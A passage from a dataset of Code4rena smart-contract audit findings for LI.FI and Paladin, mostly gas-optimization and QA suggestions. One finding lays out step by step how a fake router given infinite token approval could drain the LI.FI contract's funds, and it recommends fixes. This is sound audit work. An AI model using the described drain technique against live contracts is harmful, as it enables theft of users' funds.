declaration\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L20\nThis implementation can be used for saving more gas (24 gas)\n\n##Tool Used\nRemix\n\n##POC\n```\n    struct AnyswapData {\n        address token;\n        address router;\n        uint256 amount;\n        address recipient;\n        uint256 toChainId;\n    }\n```\nchange to :\n```\n    struct AnyswapData {\n        address token;\n        address router;\n        address recipient;\n        uint256 amount;\n        uint256 toChainId;\n    }\n```\n\n6. Better way `SafeERC20.function` to saving more gas\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L9\n\nthis implementation can be used for another gas opt\n\n##Tool used\nRemix\n\n##POC\nby not declare :\n\n```\nusing SafeERC20 for IERC20;\n```\t\nand change at :\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L35\n\n```\nSafeERC20.safeTransfer(IERC20(_assetAddress), sendTo, _amount);\n```\n\n7. Change 2**256 - 1 to type(uint).max\n\nits cheaper to using type(uint).max instead of using 2**256-1 calculation for unlimited approval\n\nPOC :\nLibAsset.sol #L15\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibAsset.sol#L15\n\n```\nuint256 private constant MAX_INT = 2**256 - 1;\n```\n\n\n8. Using short reason string can saving more gas \n\nEvery reason string takes at least 32 bytes. Use short reason strings that fits in 32 bytes or it will become more expensive.\n\nOccurance :\n```\nLibDiamond.sol #L102\nLibDiamond.sol #L187\nLibDiamond.sol #L189\n```\n\n9. Instead of caching `calldata` can be using `memory` for saving more gas\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L57\nThis implementation can be using for saving more gas.\n\n##Tool used\nRemix\n\n\n##POC\n\n```\n    function startBridgeTokensViaCBridge(LiFiData memory _lifiData, CBridgeData calldata _cBridgeData) public payable { // ---> 2166900 deploy\n```\n\ncan be changed to \n\n```\n    function startBridgeTokensViaCBridge(LiFiData memory _lifiData, CBridgeData memory _cBridgeData) public payable { // ---> 2133888 deploy \n",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/172"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# 1. Prefix increments are cheaper than postfix increments\n\n## Impact\n\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the i++ in for  for (uint8 i; i < _swapData.length; i++) {.\nIncrements perform overflow checks that are not necessary in this case.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/Swapper.sol#L14\n\n\n## Recommended Mitigation Steps\nSurround the increment expressions with an unchecked { ... } block to avoid the default overflow checks. \n\n# 2. `uint8` is less efficient than `uint256` in loop iterations\n## Impact\nThis loop use uint8 for an index parameter (i). It does not give any efficiency, actually, it is the   opposite as EVM operates on default of 256-bit values so uint8 is more expensive in this case as it needs a conversion. It only gives improvements in cases where you can pack variables together, e.g. structs.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/Swapper.sol#L14\n\n```\nfor (uint8 i; i < _swapData.length; i++) {.\n```\n## Recommended Mitigation Steps\nReplace uint8 with uint256 in loop iterations.\n\n\n\n# 3. > 0 can be replaced with != 0 for gas optimisation\n\n## Impact\n!= 0 is a cheaper operation compared to > 0, when dealing with uint.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L116\nThere are several other places throughout the codebase where the same optimization can be used.\n\n# 4. Use Custom Errors to save Gas\n## Impact\nCustom errors are cheaper than revert strings.\n## Proof of Concept\nSource: https://blog.soliditylang.org/2021/04/21/custom-errors/:\nStarting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\nCustom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\n## Recommended Mitigation Steps\nReplace revert strings with custom errors.\n\n# 5. Long Revert Strings \n\n## Impact\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.\n## Proof of Concept\n\n```\nrequire(s.cBridgeChainId != _cBridgeData.dstChainId, \"Cannot bridge to the same network.\");\n```\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L147\n\n\n\nThere are several other places throughout the codebase where the same optimization can be used.\n\n\nhttps://planetcalc.com/9029/\n## Recommended Mitigation Steps\nShorten the revert strings to fit in 32 bytes\n\n# 6. Adding unchecked directive can save gas (6 findings)\n## Impact\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L166\n\n```\n if (postSwapBalance > startingBalance) {\n            finalBalance = postSwapBalance - startingBalance;\n```\n## Recommended Mitigation Steps\nConsider using 'unchecked' where it is safe to do so.\n\n\n\n\n\n\n\n\n\n\n\n# 6. && operator can use more gas\n## Impact\nMore expensive gas usage\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/Swapper.sol#L16\n\n```\nrequire( ls.dexWhitelist[_swapData[i].approveTo] == true && ls.dexWhitelist[_swapData[i].callTo] == true,\n                \"Contract call not allowed!\"\n            );\n```\n## Recommended Mitigation Steps\nInstead of using operator && on single require check  using double require check can save more gas\n\n\n# 7. Avoid use of state variables in event emissions to save gas \n## Impact\nWhere possible, use equivalent function parameters or local variables in event emits instead of state variables to prevent expensive SLOADs. Post-Berlin, SLOADs on state variables accessed first-time in a transaction increased from 800 gas to 2100, which is a 2.5x increase.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L47\nThe `Inited` event i uses state variable `s.cBridge` and `s.cBridgeChainId ` instead of using the equivalent function parameters `_cBridge` and `_chainId`which were just used to set these state variables. \n```\nfunction initCbridge(address _cBridge, uint64 _chainId) external {\n        Storage storage s = getStorage();\n        LibDiamond.enforceIsContractOwner();\n        s.cBridge = _cBridge;\n        s.cBridgeChainId = _chainId;\n        emit Inited(s.cBridge, s.cBridgeChainId);\n    }\n```\n## Recommended Mitigation Steps\nUse equivalent function parameters or local variables in event emits instead of state variables.\n\n# 8. Free gas savings for using solidity 0.8.10+ \n\n## Impact\n\nGas savings\n## Proof of Concept\n\nSolidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/\n\n\n    Code Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist\n\nLIFI protocol is using 0.8.6:\nUpdating to the newer version of solc will allow contracts to take advantage of these lower costs for external calls.\n\n## Recommended Mitigation Steps\n\nUpdate to 0.8.10+\n\n\n\n\n\n\n\n\n\n\n\n# 9. Caching variables (3 findings)\n\n## Impact\nSome of the variable can be cached to slightly reduce gas usage.\n## Proof of Concept\n\n `LibAsset`  can be cached.\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L46-L76\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L124-L140\n\n\n`IERC20(_assetAddress)` can be cached.\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L33-L35\n\n\n## Recommended Mitigation Steps\nConsider caching those variable for read and make sure write back to storage\n\n\n# 10. Gas optimization on 2**256 - 1\n# Vulnerability details\n## Impact\nwhen using 2**256 - 1 it takes more gas, than using type(uint256).max\n## Proof of Concept\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L15\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibSwap.sol#L8\n## Recommended Mitigation Steps\nUse type(uint256).max\n",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/171"
    }
  },
  {
    "title": "QA Report",
    "body": "## Title: Unlocked pragma\n\n### Impact \nContracts should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.5.10) ensures that contracts do not accidentally get deployed using an older compiler version with unfixed bugs. More information can be seen in SWC Registry: https://swcregistry.io/docs/SWC-103\n\n### Recommended Mitigation Steps\nUse locked pragma for contracts.\n\n---------------------------------------------------------------------------\n\n## Title: LiFiDiamond.sol is missing EIP-2535 dependency\n\n### Impact\nIt should be clearly visible in code which part is customization and which part comes from public standard. Documentation states that LI.FI Contract is built using the EIP-2535 (Multi-facet Proxy) standard however in code that is not clearly visible. LiFiDiamond.sol logic is a copy from Diamond.sol. It would be better to use import and inheritance because if there is discovered a bug in EIP-2535 Diamond.sol then it is harder to detect the same bug in LiFiDiamond.sol. \n\n### Recommended Mitigation Steps\nUse import and inheritance from Diamond.sol https://github.com/mudgen/diamond-3-hardhat/blob/main/contracts/Diamond.sol\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/LiFiDiamond.sol#L7\n\n---------------------------------------------------------------------------\n\n## Title: Unused imports\n\n### Impact\nContracts inheriting from multiple contracts with identical functions should specify the correct inheritance order i.e. more general to more specific to avoid inheriting the incorrect function implementation. https://swcregistry.io/docs/SWC-125\n\n\n\n### Recommended Mitigation Steps\nRemove unnecessary imports. In the following files there are contract imports that aren't used:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/AnyswapFacet.sol#L6\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/AnyswapFacet.sol#L9\n\n\n---------------------------------------------------------------------------\n\n## Title: In place of a number use type(T).max\n\n### Impact\ntype(T).max should be used for max value and not a number.\n\n\n### Recommended Mitigation Steps\nChange:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L8\n\nFrom:\nuint256 private constant MAX_INT = 2**256 - 1;\nTo:\nuint256 private constant MAX_INT = type(uint256).max;\n\n---------------------------------------------------------------------------\n\n## Title: Unused inheritance functionality\n\n### Impact\nContract should not inherit if functionality of inheritance is not used. Swapper.sol inherits ILiFi however nothing is used from ILiFi.\n\n\n### Recommended Mitigation Steps\nRemove:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/Swapper.sol#L4\nand ILiFi inheritance at\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/Swapper.sol#L8\n\n---------------------------------------------------------------------------\n\n## Title: Use consistently index\n\n### Impact\nParameters of certain events are expected to be indexed (e.g. ERC20 Transfer/Approval events) so that they’re included in the block’s bloom filter for faster access. Failure to do so might confuse off-chain tooling looking for such indexed events.\n\nEvent AssetSwapped does not use any index:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L19-L27\n\n\n### Recommended Mitigation Steps\nIndex transactionId for event AssetSwapped because transactionId is indexed also in ILiFi.sol\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Interfaces/ILiFi.sol",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/169"
    }
  },
  {
    "title": "QA Report",
    "body": "## [L] `HopFacet#startBridgeTokensViaHop()` `sendingAssetId` with non-native asset, msg.value is not enforced to be 0, makes it possible for users to loss the msg.value if they send any\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/HopFacet.sol#L61-L87\n\n```solidity=61{\n    function startBridgeTokensViaHop(LiFiData memory _lifiData, HopData calldata _hopData) public payable {\n        address sendingAssetId = _bridge(_hopData.asset).token;\n\n        if (sendingAssetId == address(0)) require(msg.value == _hopData.amount, \"ERR_INVALID_AMOUNT\");\n        else {\n            uint256 _sendingAssetIdBalance = LibAsset.getOwnBalance(sendingAssetId);\n            LibAsset.transferFromERC20(sendingAssetId, msg.sender, address(this), _hopData.amount);\n            require(\n                LibAsset.getOwnBalance(sendingAssetId) - _sendingAssetIdBalance == _hopData.amount,\n                \"ERR_INVALID_AMOUNT\"\n            );\n        }\n\n        _startBridge(_hopData);\n\n        emit LiFiTransferStarted(\n            _lifiData.transactionId,\n            _lifiData.integrator,\n            _lifiData.referrer,\n            _lifiData.sendingAssetId,\n            _lifiData.receivingAssetId,\n            _lifiData.receiver,\n            _lifiData.amount,\n            _lifiData.destinationChainId,\n            block.timestamp\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/HopFacet.sol#L134-L178\n\n```solidity=134{151,155,167}\n    function _startBridge(HopData memory _hopData) internal {\n        Storage storage s = getStorage();\n        address sendingAssetId = _bridge(_hopData.asset).token;\n\n        address bridge;\n        if (s.hopChainId == 1) {\n            bridge = _bridge(_hopData.asset).bridge;\n        } else {\n            bridge = _bridge(_hopData.asset).ammWrapper;\n        }\n\n        // Do HOP stuff\n        require(s.hopChainId != _hopData.chainId, \"Cannot bridge to the same network.\");\n\n        // Give Hop approval to bridge tokens\n        LibAsset.approveERC20(IERC20(sendingAssetId), bridge, _hopData.amount);\n\n        uint256 value = LibAsset.isNativeAsset(address(sendingAssetId)) ? _hopData.amount : 0;\n\n        if (s.hopChainId == 1) {\n            // Ethereum L1\n            IHopBridge(bridge).sendToL2{ value: value }(\n                _hopData.chainId,\n                _hopData.recipient,\n                _hopData.amount,\n                _hopData.destinationAmountOutMin,\n                _hopData.destinationDeadline,\n                address(0),\n                0\n            );\n        } else {\n            // L2\n            // solhint-disable-next-line check-send-result\n            IHopBridge(bridge).swapAndSend{ value: value }(\n                _hopData.chainId,\n                _hopData.recipient,\n                _hopData.amount,\n                _hopData.bonderFee,\n                _hopData.amountOutMin,\n                _hopData.deadline,\n                _hopData.destinationAmountOutMin,\n                _hopData.destinationDeadline\n            );\n        }\n    }\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=61{66}\n    function startBridgeTokensViaHop(LiFiData memory _lifiData, HopData calldata _hopData) public payable {\n        address sendingAssetId = _bridge(_hopData.asset).token;\n\n        if (sendingAssetId == address(0)) require(msg.value == _hopData.amount, \"ERR_INVALID_AMOUNT\");\n        else {\n            require(msg.value == 0, \"ERR_INVALID_AMOUNT\");\n            uint256 _sendingAssetIdBalance = LibAsset.getOwnBalance(sendingAssetId);\n            LibAsset.transferFromERC20(sendingAssetId, msg.sender, address(this), _hopData.amount);\n            require(\n                LibAsset.getOwnBalance(sendingAssetId) - _sendingAssetIdBalance == _hopData.amount,\n                \"ERR_INVALID_AMOUNT\"\n            );\n        }\n\n        _startBridge(_hopData);\n\n        emit LiFiTransferStarted(\n            _lifiData.transactionId,\n            _lifiData.integrator,\n            _lifiData.referrer,\n            _lifiData.sendingAssetId,\n            _lifiData.receivingAssetId,\n            _lifiData.receiver,\n            _lifiData.amount,\n            _lifiData.destinationChainId,\n            block.timestamp\n        );\n    }\n```\n\n## [N] Use of assert() instead of require()\n\nContracts use assert() instead of require() in multiple places.\n\nPer to Solidity’s documentation:\n\n> \"Assert should only be used to test for internal errors, and to check invariants. Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix. Language analysis tools can evaluate your contract to identify the conditions and function calls which will cause a Panic.”\n\nhttps://github.com/code-423n4/2022-03-Li.finance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L30-L30\n\n```solidity=30\n            assert(_amount <= self.balance);\n```\n\nhttps://github.com/code-423n4/2022-03-Li.finance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L34-L34\n\n```solidity=34\n            assert(_amount <= assetBalance);\n```\n\n\n### Recommendation\n\nChange to `require()`.\n\n## [N] The same library is being import twice\n\nhttps://github.com/code-423n4/2022-03-Li.finance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L6-L6\n\n```solidity\nimport { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n```\n\nhttps://github.com/code-423n4/2022-03-Li.finance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L9-L9\n\n```solidity\nimport { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/165"
    }
  },
  {
    "title": "[WP-H7] Infinite approval to an arbitrary address can be used to steal all the funds from the contract",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L131-L157\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L131-L157\n\n```solidity\nfunction _startBridge(AnyswapData memory _anyswapData) internal {\n    // Check chain id\n    require(block.chainid != _anyswapData.toChainId, \"Cannot bridge to the same network.\");\n    address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n\n    if (underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n        IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(\n            _anyswapData.token,\n            _anyswapData.recipient,\n            _anyswapData.toChainId\n        );\n        return;\n    }\n\n    if (_anyswapData.token != address(0)) {\n        // Has underlying token?\n        if (underlyingToken != address(0)) {\n            // Give Anyswap approval to bridge tokens\n            LibAsset.approveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount);\n\n            IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(\n                _anyswapData.token,\n                _anyswapData.recipient,\n                _anyswapData.amount,\n                _anyswapData.toChainId\n            );\n        } else {\n```\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L59-L70\n\n```solidity\nfunction approveERC20(\n    IERC20 assetId,\n    address spender,\n    uint256 amount\n) internal {\n    if (isNativeAsset(address(assetId))) return;\n    uint256 allowance = assetId.allowance(address(this), spender);\n    if (allowance < amount) {\n        if (allowance > 0) SafeERC20.safeApprove(IERC20(assetId), spender, 0);\n        SafeERC20.safeApprove(IERC20(assetId), spender, MAX_INT);\n    }\n}\n```\n\nIn the `AnyswapFacet.sol`, `_anyswapData.router` is from the caller's calldata, which can really be any contract, including a fake Anyswap router contract, as long as it complies to the interfaces used.\n\nAnd in `_startBridge`, it will grant infinite approval for the `_anyswapData.token` to the `_anyswapData.router`.\n\nThis makes it possible for a attacker to steal all the funds from the contract.\n\nWhich we explained in [WP-H6], the diamond contract may be holding some funds for various of reasons.\n\n### PoC\n\nGiven:\n\n- There are 100 USDC tokens in the contract.\n\n1. The attacker can submit a `startBridgeTokensViaAnyswap()` with a FAKE `_anyswapData.router`.\n2. Once the FAKE router contract deployed by the attacker got the infinite approval from the diamond contract, the attacker can call `transferFrom()` and take all the funds, including the 100 USDC in the contract anytime.\n\n### Recommendation\n\n1. Whitelisting the `_anyswapData.router` rather than trusting user's inputs;\n2. Or, only `approve()` for the amount that required for the current transaction instead of infinite approval.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/160"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "gas\n\n#1 Unnecessary `require()` \nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L183\n`transferOwnership()` function was validating that `_admin` != address(0). I recommend to remove L183 or call `_transferOwnerShip()` instead of `transferOwnership`\n\n\n#2 != is more effective than >\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L229\nUsing != 0 is more gas effective > 0\n\n\n#3 Using `SafeERC20` Lib for pal token\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L13\nUsing `SafeERC20.function` for pal token is unnecessary. Using just `transfer` and `transferFrom` from ERC20.function is gas saving\n\n\n#4 Unnecessary `burnAmountx` variable declaration in `_unstake` function\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1090\nInstead of using ternary operation, using if() statement can save gas, then just store the value amount to burn to `amount` var:\n```\nIf(amount > userAvailableBalance){\n\tamount = userAvailableBalance;\n}\n_burn(user, amount);\npal.safeTransfer(receiver, amount);\nemit Unstake(user, amount);\nreturn amount\n```\n\n\n#5 Declaration bool with default value\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L103\nBy not declaring that `emergency` = false, the value will still == false. So delete the value set at L103\n\n\n#6 Unnecessary `rewardLastUpdate[user]` == block.timestamp\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L861\nThe only way to update `rewardLastUpdate[user]`is in the same function (_updateUserReward()). Therefore, the condition `rewardLastUpdate[user]` == block.timestamp is an edge case (its quite hard to have exact the same block.timestamp since it is updated per second), and have no security risk.\n\n\n#7 Using if() statement instead of ternary operation\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1206\nBy using if() statement, MSTORE when the condition == false will prevented and also reducing gas cost\n```\nIf(action == LockAction.INCREASE_AMOUNT) startTimestamp = currentUserLock.startTimestamp;\n```\n\n\n#8 Prevent too many SLOAD and using if instead of ternary operation\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L388\nBy chacing `claimableReward[msg.sender]` to `claimAmount` and using if condition to set `claimAmount` = `amount` (also prevent MSTORE) can be a lot efficient:\n```\nuint claimAmount = claimableRewards[msg.sender];\n\nif(amount < claimAmount)claimAmount = amount;\n```\n\n\n#9 Gas improvement on calling `SafeERC20.function`\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L13\nIn case SafeERC20 is used. By removing L13 and call `SafeERC20.function` directly in line can save 15 gas per call.\nFor [instance](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1372):\n```\nSafeERC20.safeTransfer(pal, msg.sender, burnAmount)\n``` \n\n\n#10 Using `storage` instead of `memory` to declare struct\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L650\nInstead of chasing `UserLock` in memory, read it directly from storage can save gas (if struct var amount > how many time it was called, better using storage pointer)\n```\nUserLock storage pastLock = _getPastLock(user, blockNumber);\n```\n\n#11 Unnecessary `votes` variable declaration\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L646\n`votes` is merely called once in the `getPastVotes` function. Avoiding unnecessary MSTORE and pass it directly to L645 can save gas:\n```\nReturn _getPastVotes(user, blockNumber) + bonusVotes;\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/93"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Remarks/Recommendations\n\n- The test suite was comprehensive and easy to run! There could have been some more tests checking what the values of rewards that are accrued.\n\n- Functions `lock`, `increaseLockDuration` and `increaseLock` all relied on a call to `_updateUserRewards` to work properly. Consider the use of a function modifier.\n\n- A function modifier could also be used for those functions which begin with  `if (emergency) revert EmergencyBlock()`. For example:\n\n```\nmodifier notEmergency {\n  if(emergency) revert EmergencyBlock();\n  _;\n}\n```\n\nAnd then the function signature of e.g. `increaseLockDuration` changes like so:\n\n```\nfunction increaseLockDuration(uint256 duration) external notEmergency {\n```\n\nIncidentally, you can test for reversions like this in your test suite with a line like:\n\n```\nawait hPAL.connect(admin).triggerEmergencyWithdraw(true)\nawait expect(hPAL.connect(user1).increaseLockDuration(63115200)).\n        to.be.revertedWith(\"VM Exception while processing transaction: reverted with custom error 'EmergencyBlock()\");\n```\n\n\n- A lot of the math involving fractional values is difficult to tell immediately whether it's correct. I suggest developing (or using) a math library for fractional values so that all the `* UNIT`  or `/ UNIT` parts of the expressions are removed. It would be similar to Open Zeppelin's `SafeMath` library but for fractional values instead.\n\n- Days and weeks really are a fixed number of seconds (86400 and 604800 respectively). However, `MONTH` and `ONE_YEAR` are not actually `2629800 s = 30.4375 days` and `31557600 s = 365.25 days` respectively. One month from 1 February is only 28 days, while from 1 March it is 31 days. It's context dependent. The same goes for years. If someone locks for a year they probably don't expect to wait an extra quarter of a day.\n\n  I suggest talking about lock durations strictly in terms of days or weeks. It will also be less confusing for users. e.g. The minimum lock period is 90 days the maximum lock period is 731 days.\n\n- Function `triggerEmergencyWithdraw` has a deceptive name. Just call it `setEmergency` since it can also be used to set the `emergency` flag to `false`.\n\n## Low: Lack of validation on constructor parameters\n\n### Impact\n\nIf the `HolyPaladinToken` contract is initialised with certain (strange) values this causes many functions to revert for the lifetime of the contract. This happens because of underflow bugs -- which are checked for by Solidity 0.8.0 and upwards) -- on the following lines:\n\n- [line 1160](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1160) and [line 1216](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1216) because `baseLockBonusRatio > minLockBonusRatio`\n- [line 729](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L729) because `startDropPerSecond < endDropPerSecond`\n- [line 1157](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1157) and [line 1213](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1213) because `minLockBonusRatio > maxLockBonusRatio`\n\n### Proof of Concept\n\nThis PoC is executable. Three different bugs that lead to reversion are recreated using your testing framework in a fork of your repo:\n- [Bug](https://github.com/sseefried/codearena-paladin-2022-03/blob/3456ce6013f4bd7f5660d90807ea48d771520033/test/noValidationOfConstructorParametersBugs.ts#L88) when `baseLockBonusRatio > minLockBonusRatio`.\n- [Bug](https://github.com/sseefried/codearena-paladin-2022-03/blob/3456ce6013f4bd7f5660d90807ea48d771520033/test/noValidationOfConstructorParametersBugs.ts#L95) when `startDropPerSecond < endDropPerSecond`\n- [Bug](https://github.com/sseefried/codearena-paladin-2022-03/blob/3456ce6013f4bd7f5660d90807ea48d771520033/test/noValidationOfConstructorParametersBugs.ts#L104) when `minLockBonusRatio > maxLockBonusRatio`\n\n### Tools Used\nManual inspection\n\n### Recommended Mitigation Steps\nAdd the following `require` declarations to the constructor of `HolyPaladinToken`\n\n```solidity\nrequire(_baseLockBonusRatio <= _minLockBonusRatio, \"_baseLockBonusRatio > _minLockBonusRatio\");\nrequire(_startDropPerSecond >= _endDropPerSecond, \"_startDropPerSecond < _endDropPerSecond\");\nrequire(_minLockBonusRatio <= _maxLockBonusRatio, \"_minLockBonusRatio > _maxLockBonusRatio\");\n```\n\n## Non-critical: `setEndDropPerSecond` can be called by admin with value higher than `startDropPerSecond`\n\n### Impact\n\nOnce `block.timestamp >= startDropTimestamp + dropDecreaseDuration` it becomes possible for the admin to call `setEndDropPerSecond` with a value higher than\n`startDropPerSecond`. This leads to a reversion in the exceedingly rare case that `_updateDropPerSecond` is called in the same transaction precisely when\n`block.timestamp == startDropTimestamp + dropDecreaseDuration`.\n\nThis is because on [line 716](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L716) of `HolyPaladinToken.sol` we have:\n\n```\nif(block.timestamp > startDropTimestamp + dropDecreaseDuration) {\n```\n\nwhich would not be true and thus the `return` on [line 